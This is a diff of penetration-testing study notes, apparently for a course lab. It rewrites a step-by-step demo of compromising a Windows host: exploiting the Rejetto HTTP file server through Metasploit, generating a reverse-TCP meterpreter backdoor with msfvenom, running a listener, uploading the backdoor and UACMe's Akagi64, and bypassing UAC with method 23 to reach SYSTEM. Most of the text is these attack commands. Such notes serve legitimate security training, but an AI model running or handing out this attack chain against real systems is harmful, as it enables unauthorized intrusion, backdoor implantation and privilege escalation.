@@ -129,112 +129,128 @@
   THis metasploit module can be used to identify kernel exploits on a target:
   multi/recon/local_exploit_suggester
 
+
 # Bypassing UAC With UACMe
-- User Account Control (UAC) is a Windows security feature introducedin Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
-- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group
-- A non-privileged user attempting to execute a program with elevated privileges will be promoted with the UAC credential prompt, whereas a privileged user will be prompted with with a consent prompt.
-- Attacks can bypass UAC in order to execute malicious executables with elevaed privileges.
+
+- **User Account Control (UAC)**: A Windows security feature introduced in Windows Vista to prevent unauthorized changes to the operating system. It ensures that changes require approval from an administrator or a user in the local administrators group.
+- A non-privileged user executing a program with elevated privileges will see a UAC prompt, while a privileged user will see a consent prompt.
+- Bypassing UAC allows execution of malicious executables with elevated privileges.
 
 ## Bypassing UAC
-- We will need to have access to a user account that is part of the local administrators group on the Windows target system
-- UAC allowes a program to be executed with administrative privileges, consequently prompting the user for confirmation.
-- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
-- Tool and technique used will depend on the version of Windows running on the target system.
+- Access to a user account in the local administrators group is needed.
+- UAC can execute programs with administrative privileges but may prompt for confirmation depending on its integrity level setting.
+- The technique and tools used to bypass UAC depend on the Windows version.
+
 ## Bypassing UAC With UACME
-- UACMe is an open source, robust privilege escalation tool which can be used to bypass Windows UAC by leveraging various techniques.
-- UACMe GitHub repository contains a documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10
-- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt WIndows AuteElevate tool.
-- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.
+- **UACMe**: An open-source tool used to bypass Windows UAC through various methods. The GitHub repository provides exploits for Windows 7 to Windows 10.
+- It enables the execution of payloads with administrative privileges by abusing the Windows AutoElevate feature.
+- The repository contains over 60 exploits for bypassing UAC, depending on the Windows version.
 
 ## Demo
 
-`nmap [target IP]`
-vulnerable http fileserver
+1. **Identify the Target System**  
+   `nmap [target IP]`  
+   - Scans the target IP to find open ports and services. This helps in identifying the vulnerable HTTP file server.
 
-`service postgresql start && msfconsole`
-starting metasploit to exploit the http fileserver vulnerability.
+2. **Start Metasploit Framework**  
+   `service postgresql start && msfconsole`  
+   - Starts the PostgreSQL service required by Metasploit and launches the Metasploit console to exploit vulnerabilities.
 
-`setg rhosts [target IP]`
-We set the target ip as rhost and "G" so we don't have to retype it when we load a new metasploit module.
+3. **Set Global Target IP**  
+   `setg rhosts [target IP]`  
+   - Sets the target IP globally in Metasploit to avoid retyping it for each module.
 
-`search rejetto`
-Rejetto fileserver which is vulnerable
+4. **Search for Vulnerable Payload**  
+   `search rejetto`  
+   - Searches for the Rejetto file server vulnerability in Metasploit modules.
 
-`use [found payload]`
+5. **Select and Use the Exploit**  
+   `use [found payload]`  
+   - Loads the exploit module found for the Rejetto file server vulnerability.
 
-`exploit`
-meterpreter session successful
+6. **Run the Exploit**  
+   `exploit`  
+   - Executes the exploit to gain access to the target system.
 
-Perform basic enumeration:
+7. **Perform Basic Enumeration**  
+   - **Meterpreter Commands**:
+     - `sysinfo`  
+       - Displays system information, including OS version and build.
+     - `pgrep explorer`  
+       - Searches for the Explorer process on the target system.
+     - `migrate 2448`  
+       - Migrates the Meterpreter session to the specified process ID (2448).
+     - `getuid`  
+       - Shows the current user ID to verify the privileges.
+     - `getprivs`  
+       - Lists the privileges of the current user.
 
-meterpreter: `sysinfo`
-Which OS, Build etc
+8. **Verify Administrative Privileges**  
+   - **Shell Commands**:
+     - `netuser`  
+       - Lists user accounts on the target system.
+     - `net localgroup administrators`  
+       - Displays members of the local administrators group to confirm administrative access.
 
-meterpreter: `pgrep explorer`
-search for explorer process
+9. **Exit Meterpreter and Generate Payload**  
+   `exit`  
+   - Exits the Meterpreter session.
+   - **Generate Payload**:  
+     `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -f exe > backdoor.exe`  
+       - Creates a Meterpreter payload (backdoor.exe) for a reverse TCP connection.
 
-meterpreter: `migrate 2448`
+10. **Upload Payload to Target**  
+    `ls`  
+    - Lists files in the current directory to verify the presence of `backdoor.exe`.
+    - **Metasploit Console Commands**:
+      - `use multi/handler`  
+        - Loads the handler module to receive the reverse shell.
+      - `set payload windows/meterpreter/reverse_tcp`  
+        - Configures the payload type for handling the reverse TCP connection.
+      - `set LHOST [own IP]`  
+        - Sets the local IP address for receiving the reverse connection.
+      - `set LPORT 1234`  
+        - Sets the port number for the reverse connection.
+      - `run`  
+        - Starts the Metasploit handler to listen for incoming connections.
 
-meterpreter: `sysinfo`
+11. **Interact with the Meterpreter Session**  
+    - **Meterpreter Commands**:
+      - `pwd`  
+        - Prints the current working directory.
+      - `getuid`  
+        - Verifies the current user ID.
+      - `getprivs`  
+        - Lists the privileges of the current user.
+      - `cd C:\\`  
+        - Changes the directory to C:\.
+      - `mkdir Temp`  
+        - Creates a new directory named Temp.
+      - `cd Temp`  
+        - Changes the directory to Temp.
+      - `upload backdoor.exe`  
+        - Uploads the generated payload to the target system.
+      - `upload /root/Desktop/tools/UACME/Akagi64.exe`  
+        - Uploads the Akagi64 executable from the local system to the target system.
 
-meterpreter: `getuid`
+12. **Bypass UAC and Execute Payload**  
+    - **Meterpreter Commands**:
+      - `shell`  
+        - Opens a command shell on the target system.
+      - **Shell Commands**:
+        - `dir`  
+          - Lists files in the current directory to confirm the presence of uploaded files.
+        - **Bypass UAC**:
+          `Akagi64.exe 23 C:\Temp\backdoor.exe`  
+          - Executes the `backdoor.exe` with administrative privileges using the Akagi64 tool with method key 23.
+        - **Verify Privileges**:
+          - `getprivs`  
+            - Lists the current privileges to ensure they are elevated.
+          - `ps`  
+            - Lists running processes, allowing migration to a high-privilege process like NT Authority\System.
+          - `migrate 688`  
+            - Migrates the Meterpreter session to process ID 688 (typically a high-privilege process).
+          - `sysinfo`  
+            - Displays system information to confirm successful privilege escalation.
 
-meterpreter: `getprivs` N
-
-meterpreter: `shell`: verifying that this user is part of the local administrator group
-
-shell: `netuser`
-
-shell: `net localgroup administrators`: admin and administrator are part of the administrator group
-
-Now after we gained access to the target system and verified that the user is part of the local administrator group, we take a closer look at UACME on GitHub
-
-shell: `exit`
-
-we generate a meterpreter payload with msfvenom, then transfering it to the target and we will use the akagi executable with the key 23 and we will then execute the payload that we generated and that should bypass UAC
-
-new tab:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[own IP] LPORT=1234 -f exe > backdoor.exe`
-
-`ls`
-we have backdoor.exe uploaded
-
-`msfconsole`
-
-
-msfconsole: `use multi/handler`
-msfconsole: `set payload windows/meterpreter/reverse_tcp`
-msfconsole: `set LHOST [own IP]`
-msfconsole: `set LPORT 1234`
-msfconsole: `run`
-Reverse TCP Handler is now ready to recieve the malicious payload we generated.
-
-Back to the meterpreter session:
-
-meterpeter: `pwd`
-
-meterpeter: `getuid`
-
-meterpeter: `getprivs`
-
-meterpeter: `cd C:\\`
-
-meterpeter: `mkdir Temp`
-
-meterpeter: `cd Temp`
-
-meterpeter: `upload backdoor.exe`
-
-meterpreter: `upload /root/Desktop/tools/UACME/Akagi64.exe`
-
-meterpreter: `shell`
-
-Shell: `dir`
-
-If we want to execute backdoor.exe with admin privileges, it wont work because of UAC. To bypass UAC we use method/kex 23
-Shell. `Akagi64.exe 23 C:\Temp\backdoor.exe`: On the tcp handler we get a new meterpreter session (target).
-`getprivs`
-`ps`: we can migrate to any of these services (NT Authority\System
-`migrate 688`
-`sysinfo`
-
-
+#Access Token Impersonation
